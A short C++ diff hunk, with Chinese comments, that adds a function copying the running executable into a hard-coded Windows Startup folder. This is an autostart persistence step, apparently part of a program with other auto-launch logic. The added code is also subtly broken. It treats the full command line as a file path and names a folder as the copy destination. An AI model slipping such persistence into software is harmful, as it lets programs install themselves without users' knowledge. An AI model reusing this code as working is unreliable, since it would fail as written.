@@ -24,6 +24,17 @@ using namespace std;
 // system32 下面多是64位程序 syswow64下面多是32位程序
 // 【使用静态库，而非动态库】
 
+void WriteStartupDir()
+{
+    CString strPath = "C:\\Users\\root\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    CString strCmd = GetCommandLine();
+    BOOL ret = CopyFile(strCmd, strPath, FALSE);
+    if (ret == FALSE) {
+        MessageBox(NULL, _T("复制文件失败，是否权限不足？\r\n"), _T("错误"), MB_ICONERROR | MB_TOPMOST);
+        ::exit(0);
+    }
+}
+
 void ChooseAutoInvoke() {
     TCHAR wcsSystem[MAX_PATH] = _T("");
     GetSystemDirectory(wcsSystem, MAX_PATH);
